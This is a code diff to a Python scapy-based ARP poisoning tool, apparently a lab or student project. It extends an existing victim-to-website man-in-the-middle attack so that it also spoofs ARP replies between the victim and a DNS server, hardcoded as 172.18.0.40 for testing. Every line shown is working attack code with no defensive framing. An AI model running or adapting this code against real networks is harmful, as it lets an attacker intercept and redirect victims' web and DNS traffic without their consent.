@@ -8,6 +8,12 @@ class ARPPoison:
         self.iface = iface
         self.victimIP = victimIP
         self.websiteIP = websiteIP
+
+        self.dnsIP = None
+        self.dnsMAC = None
+
+        # TODO This is for testing purposes only
+        self.set_dns("172.18.0.40")
     
     def get_mac(self, IP):
         try:
@@ -22,6 +28,12 @@ class ARPPoison:
     def set_mac(self):
         self.victimMAC = self.get_mac(self.victimIP)
         self.websiteMAC = self.get_mac(self.websiteIP)
+
+    def set_dns(self, dnsIP):
+        if self.dnsIP is None:
+            self.dnsIP = dnsIP
+            self.dnsMAC = self.get_mac(dnsIP)
+            print(f"> DNS server discovered: {dnsIP}")
     
     def poison(self, target, pretend, MAC):
         # Note: Ignore warning when running, adding Ether 'hwdst' will break the poisoning
@@ -42,16 +54,21 @@ class ARPPoison:
         scapy.send(pkt, iface=self.iface)
         pkt = scapy.ARP(op=2, pdst=ptarget2, hwdst=hwt2, psrc=ptarget1, hwsrc=hwt1)
         scapy.send(pkt, iface=self.iface)
-        print("> ARP tables restored. Exiting...")
-        exit(0)
         
     def attack(self, timer, stop_event):
         self.set_mac()
         self.ip_forward(True)
+
         while not stop_event.is_set():
+                # Victim <--- Attacker ---> Website
                 self.poison(self.victimIP, self.websiteIP, self.victimMAC)
                 self.poison(self.websiteIP, self.victimIP, self.websiteMAC)
-                # TODO Also poison the DNS server
+                
+                # Victim <--- Attacker ---> DNS Server (if discovered)
+                if self.dnsIP and self.dnsMAC:
+                    self.poison(self.victimIP, self.dnsIP, self.victimMAC)
+                    self.poison(self.dnsIP, self.victimIP, self.dnsMAC)
+
                 time.sleep(10.5 - timer)
             
         self.ip_forward(False)
